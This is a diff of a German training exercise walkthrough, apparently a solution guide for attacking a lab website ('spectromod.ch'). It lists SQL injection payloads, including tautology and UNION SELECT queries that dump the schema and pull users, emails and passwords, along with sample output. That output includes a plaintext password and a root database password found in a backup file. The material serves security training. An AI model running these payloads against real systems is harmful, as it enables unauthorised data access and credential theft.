@@ -25,11 +25,7 @@ Der noch nicht veröffentlichte Geschäftsbericht ist unter der URL verfügbar.
 
    a' OR '1%' = '1
 
-. UNION auf SQL Injection
-
-   a' OR '1' = '1' UNION SELECT 1, 'Test', 'http://www.test.com' from information_schema.tables WHERE  '1%' = '1
-
-. Informationen über SQL Schema
+. Informationen über SQL Schema via UNION
 
    ' UNION SELECT concat(table_schema, '.', table_name), '', 1 from information_schema.tables WHERE  '1%' = '1
 
@@ -104,8 +100,21 @@ Netzwerk ist unter https://www.spectromod.ch/schulung/spectromod/downloads/netzw
 
    ' UNION SELECT concat(email, ' - ', password), '', 1 from spectromod.customer WHERE user = 'admin' AND '1%' = '1
 
-    admin@spectromod.ch
+    admin@spectromod.ch - ADMIN
 
+. Geschäftsführer (sichtbar im Organigram) E-Mail auslesen
+
+   ' UNION SELECT concat(user, ' - ', email, ' - ', password), '', 1 from spectromod.customer WHERE '1%' = '1
+
+    peter.sturm - peter.sturm@spectromod.ch - ORox311%KV
+
+=== Root Passwort
+
+* In der Datei https://www.spectromod.ch/schulung/spectromod/downloads/datenbank-backup.pdf findet man das Root Passwort
+
+    root / spectromod
+
+. Versuch via MySQL-Client eine Verbindung aufzubauen funktioniert nicht
 
 === XSS
 
